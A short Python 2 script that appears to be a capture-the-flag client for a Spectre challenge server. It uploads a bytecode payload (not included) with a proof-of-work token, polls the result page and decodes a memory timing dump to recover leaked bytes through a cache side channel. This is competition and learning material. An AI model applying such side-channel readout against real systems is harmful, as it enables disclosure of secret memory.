#!/usr/bin/env python

import sys,  time

from requests import get, post
from pprint import pprint

try:
    my_file = sys.argv[1]
except:
    my_file = None

hash_list = open("./hash", "r").read(10000000).strip().split("\n")

token = hash_list[0]
hash_list = hash_list[1:]

f = open("./hash", "w")
for i in hash_list:
    f.write(i + '\n')
f.close()

url = 'http://spectre.pwni.ng:4000/'

files = {
    'script': open(my_file if my_file else './bytecode', 'rb'),
}

data = {
    'pow': token
}

c = post(url, data=data, files=files)
result = c.history[0].headers['Location']

while True:
    c = get(result)
    data = c.content

    if 'Processing.' in data:
        time.sleep(2)
        continue

    break

if 'FFFFFFFF FFFFFFFF' in data:
    # processing 4141 mem
    mem = []
    _ = data.split('<pre style="background-color: white; margin: 2rem 0; padding: 2rem 0">')[1].split('</pre>')[0].strip().replace(' ', '').replace('\n', '')
    for i in xrange(0, len(_), 16):
        low = int(_[i: i+8], 16)
        high = int(_[i+8: i+16], 16) << 32
        mem.append(low + high)

    #for i in range(len(mem)):
    for i in range(0, 0x80):
        if (mem[i] < 100):
            print 'idx : 0x%02x' %(i), ': ', hex(mem[i])
            print chr(i)
        



else:
    print(data)
